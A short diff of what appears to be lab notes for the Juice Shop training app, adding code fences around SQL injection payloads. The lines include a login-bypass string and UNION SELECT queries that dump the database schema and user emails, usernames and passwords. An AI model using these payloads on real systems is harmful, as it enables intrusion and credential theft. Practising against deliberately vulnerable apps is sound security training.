@@ -85,7 +85,7 @@ admin") or "1"="1"#
 admin") or "1"="1"/*
 ```
 # SQL Inject Extract Schema Database Juice-Shop
-
+```
 ')
 
 ')) --
@@ -97,7 +97,7 @@ admin") or "1"="1"/*
 ')) union all select 1,2,3,sql,5,6,7,8,9 from sqlite_master -- 
 
 ')) union all select 1,email,username,4,password,6,7,8,9 from Users -- 
-
+```
 Link
 
 https://www.urlencoder.org
